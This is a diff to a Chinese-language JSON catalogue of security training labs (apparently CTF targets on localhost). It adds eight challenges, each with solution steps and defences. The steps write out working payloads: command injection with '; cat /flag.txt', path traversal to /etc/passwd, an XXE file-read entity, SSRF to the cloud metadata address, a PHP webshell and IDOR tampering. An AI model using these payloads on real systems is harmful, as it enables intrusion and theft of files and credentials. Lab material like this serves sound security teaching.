@@ -89,6 +89,190 @@
         "防御手段：HTML 转义、CSP、HttpOnly Cookie"
       ],
       "docker_run": "docker run -d -p 8084:8084 --name netlearn-target4 netlearn-target4"
+    },
+    {
+      "id": 5,
+      "name": "命令注入：Ping 工具",
+      "description": "网络诊断工具未过滤输入，可执行系统命令读取敏感文件。",
+      "difficulty": "medium",
+      "category": "Web",
+      "default_port": 8085,
+      "skills": ["命令注入", "系统安全"],
+      "solution_steps": [
+        "启动靶机：python target5_cmdi.py 8085",
+        "访问 http://localhost:8085",
+        "在 IP 输入框输入：127.0.0.1; cat /flag.txt",
+        "或使用其他分隔符：127.0.0.1 | cat /flag.txt",
+        "查看命令执行结果中的 Flag",
+        "把 Flag 提交到网站验证"
+      ],
+      "learn_points": [
+        "命令注入原理：用户输入拼接到系统命令",
+        "常见分隔符：; | & ` $()",
+        "防御：白名单验证、避免 shell 执行、使用 API 替代"
+      ],
+      "docker_run": "docker run -d -p 8085:8085 --name netlearn-target5 netlearn-target5"
+    },
+    {
+      "id": 6,
+      "name": "本地文件包含",
+      "description": "文档系统参数未过滤，可通过路径遍历读取任意文件。",
+      "difficulty": "medium",
+      "category": "Web",
+      "default_port": 8086,
+      "skills": ["文件包含", "路径遍历"],
+      "solution_steps": [
+        "启动靶机：python target6_lfi.py 8086",
+        "访问 http://localhost:8086",
+        "点击「首页」或「关于我们」查看正常页面",
+        "修改 URL 参数：?page=../../flag.txt",
+        "或尝试：?page=/etc/passwd",
+        "读取 Flag 并提交"
+      ],
+      "learn_points": [
+        "本地文件包含（LFI）原理",
+        "路径遍历：../ 跳出目录",
+        "防御：白名单验证、禁止 ../、限制访问目录"
+      ],
+      "docker_run": "docker run -d -p 8086:8086 --name netlearn-target6 netlearn-target6"
+    },
+    {
+      "id": 7,
+      "name": "CSRF 跨站请求伪造",
+      "description": "修改密码接口未验证 CSRF Token，可被跨站伪造请求。",
+      "difficulty": "medium",
+      "category": "Web",
+      "default_port": 8087,
+      "skills": ["CSRF", "会话安全"],
+      "solution_steps": [
+        "启动靶机：python target7_csrf.py 8087",
+        "访问 http://localhost:8087",
+        "查看个人资料页面，Flag 直接显示",
+        "测试修改密码功能（无 CSRF 保护）",
+        "理解 CSRF 攻击原理",
+        "学习防御方案：CSRF Token、SameSite Cookie"
+      ],
+      "learn_points": [
+        "CSRF 原理：诱导用户点击恶意链接执行操作",
+        "攻击场景：修改密码、转账、删除数据",
+        "防御：CSRF Token、验证 Referer、SameSite Cookie"
+      ],
+      "docker_run": "docker run -d -p 8087:8087 --name netlearn-target7 netlearn-target7"
+    },
+    {
+      "id": 8,
+      "name": "XXE XML 外部实体注入",
+      "description": "XML 解析未禁用外部实体，可读取服务器任意文件。",
+      "difficulty": "hard",
+      "category": "Web",
+      "default_port": 8088,
+      "skills": ["XXE", "XML 安全"],
+      "solution_steps": [
+        "启动靶机：python target8_xxe.py 8088",
+        "访问 http://localhost:8088",
+        "在 XML 输入框注入外部实体：",
+        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///flag.txt\">]>",
+        "<user><name>&xxe;</name></user>",
+        "解析后查看 Flag"
+      ],
+      "learn_points": [
+        "XXE 原理：XML 解析器处理外部实体引用",
+        "攻击：读取文件、SSRF、DoS",
+        "防御：禁用 DTD、禁用外部实体、使用安全解析库"
+      ],
+      "docker_run": "docker run -d -p 8088:8088 --name netlearn-target8 netlearn-target8"
+    },
+    {
+      "id": 9,
+      "name": "SSRF 服务端请求伪造",
+      "description": "URL 抓取工具未验证目标地址，可访问内网资源。",
+      "difficulty": "hard",
+      "category": "Web",
+      "default_port": 8089,
+      "skills": ["SSRF", "内网渗透"],
+      "solution_steps": [
+        "启动靶机：python target9_ssrf.py 8089",
+        "访问 http://localhost:8089",
+        "在 URL 输入框输入：http://127.0.0.1:8080/flag",
+        "或尝试：http://localhost/flag",
+        "访问云元数据：http://169.254.169.254/latest/meta-data/",
+        "获取 Flag 并提交"
+      ],
+      "learn_points": [
+        "SSRF 原理：服务端发起请求未验证目标",
+        "攻击：访问内网、云元数据、本地服务",
+        "防御：白名单验证、禁止内网 IP、禁用危险协议"
+      ],
+      "docker_run": "docker run -d -p 8089:8089 --name netlearn-target9 netlearn-target9"
+    },
+    {
+      "id": 10,
+      "name": "文件上传漏洞",
+      "description": "头像上传功能未验证文件类型，可上传 Webshell 执行命令。",
+      "difficulty": "medium",
+      "category": "Web",
+      "default_port": 8090,
+      "skills": ["文件上传", "Webshell"],
+      "solution_steps": [
+        "启动靶机：python target10_upload.py 8090",
+        "访问 http://localhost:8090",
+        "上传 PHP Webshell：<?php system($_GET['cmd']); ?>",
+        "访问上传的文件：/uploads/shell.php?cmd=cat /flag.txt",
+        "查看命令执行结果中的 Flag",
+        "提交 Flag 验证"
+      ],
+      "learn_points": [
+        "文件上传漏洞原理：未验证文件类型/内容",
+        "Webshell：可执行系统命令的恶意文件",
+        "防御：白名单验证、检查文件头、禁止执行上传目录"
+      ],
+      "docker_run": "docker run -d -p 8090:8090 --name netlearn-target10 netlearn-target10"
+    },
+    {
+      "id": 11,
+      "name": "越权访问（IDOR）",
+      "description": "订单查询接口未验证用户身份，修改 URL 参数即可访问他人数据。",
+      "difficulty": "easy",
+      "category": "Web",
+      "default_port": 8091,
+      "skills": ["越权", "身份验证"],
+      "solution_steps": [
+        "启动靶机：python target11_idor.py 8091",
+        "访问 http://localhost:8091",
+        "使用 user1/password1 登录",
+        "点击「查看我的订单」，URL 为 /order?user_id=1",
+        "修改 URL 参数：/order?user_id=2",
+        "查看管理员订单中的 Flag"
+      ],
+      "learn_points": [
+        "越权访问（IDOR）原理：未验证资源所有权",
+        "水平越权 vs 垂直越权",
+        "防御：从 Session 获取用户 ID、验证资源权限"
+      ],
+      "docker_run": "docker run -d -p 8091:8091 --name netlearn-target11 netlearn-target11"
+    },
+    {
+      "id": 12,
+      "name": "弱加密破解",
+      "description": "系统使用 Base64/MD5 等弱加密存储密码，可被在线破解。",
+      "difficulty": "easy",
+      "category": "加密",
+      "default_port": 8092,
+      "skills": ["密码学", "弱加密"],
+      "solution_steps": [
+        "启动靶机：python target12_crypto.py 8092",
+        "访问 http://localhost:8092",
+        "查看页面泄露的 Base64 和 MD5 值",
+        "使用在线工具破解 MD5（如 cmd5.com）",
+        "或使用 Base64 解码获取明文密码",
+        "使用破解的密码登录获取 Flag"
+      ],
+      "learn_points": [
+        "Base64 是编码不是加密，可逆",
+        "MD5 已被证明不安全，可被碰撞/字典攻击",
+        "防御：使用 bcrypt/scrypt/Argon2 加盐哈希"
+      ],
+      "docker_run": "docker run -d -p 8092:8092 --name netlearn-target12 netlearn-target12"
     }
   ]
 }
